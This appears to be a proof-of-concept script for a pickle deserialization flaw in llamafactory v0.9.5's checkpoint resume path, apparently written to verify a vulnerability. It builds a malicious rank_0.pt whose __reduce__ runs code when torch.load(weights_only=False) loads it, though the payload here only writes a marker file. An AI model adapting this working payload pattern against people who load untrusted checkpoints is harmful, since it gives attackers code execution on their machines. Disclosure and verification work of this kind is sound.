"""llamafactory v0.9.5 checkpoint.py dataloader-state pickle RCE (function level, real package).

Upstream ``TrainingCheckpointCoordinator.resume`` restores the dataloader state via
``torch.load(dl_path, map_location="cpu", weights_only=False)`` on
``<ckpt>/dataloader/rank_<n>.pt``.  The PoC drives the real upstream ``resume()`` with a
minimal trainer stand-in: metadata.json plus the malicious dataloader payload.  The model
directory is intentionally absent so the surrounding upstream code is inert; the sink itself
is the verbatim upstream call.
"""

from __future__ import annotations

import json
import pickle
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402


def _materialize(marker_path: str, marker_text: str):
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return {"state": 1}


class _Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text))


def main() -> None:
    import torch  # real installed build inside the pinned llamafactory env

    import llamafactory  # noqa: F401
    from llamafactory.v1.core.utils.checkpoint import TrainingCheckpointCoordinator

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    src = poclib.upstream_path(manifest["root_cause"]["source"])
    if not src.is_file():
        poclib.fail(f"missing pinned upstream source: {src}")

    poclib.start_marker("ABSENT")
    ckpt = poclib.EVIDENCE_DIR / "ckpt"
    dl = ckpt / "dataloader"
    dl.mkdir(parents=True, exist_ok=True)
    payload = _Payload(str(poclib.MARKER_FILE), poclib.MARKER_TEXT)
    (dl / "rank_0.pt").write_bytes(pickle.dumps(payload, protocol=4))
    (ckpt / "metadata.json").write_text(
        json.dumps({"global_step": 1, "epoch": 0.0}), encoding="utf-8"
    )

    trainer = types.SimpleNamespace(
        args=types.SimpleNamespace(output_dir=str(ckpt), dist_config=None, save_ckpt_as_hf=False),
        global_step=0,
        _resume_epoch=0.0,
        model=object(),
        optimizer=None,
        device="cpu",
        lr_scheduler=None,
        train_batch_generator=types.SimpleNamespace(load_state_dict=lambda state: None),
        renderer=None,
        num_training_steps=1,
    )
    coordinator = TrainingCheckpointCoordinator(trainer)

    post_sink_error = None
    try:
        coordinator.resume(str(ckpt))
    except Exception as exc:  # sink has already executed the payload
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream resume dataloader sink",
                    post_sink_error=post_sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+resume()+torch.load(weights_only=False)",
                "entrypoint": "llamafactory.v1.core.utils.checkpoint.TrainingCheckpointCoordinator.resume",
                "llamafactory_version": llamafactory.__version__,
                "torch_version": torch.__version__,
                "source": poclib.rel(src),
                "source_sha256": poclib.sha256_file(src),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "checkpoint_file": poclib.rel(dl / "rank_0.pt"),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": post_sink_error,
            },
            "request_response": [
                {
                    "dir": "untrusted checkpoint dir -> coordinator.resume -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written inside the upstream sink",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
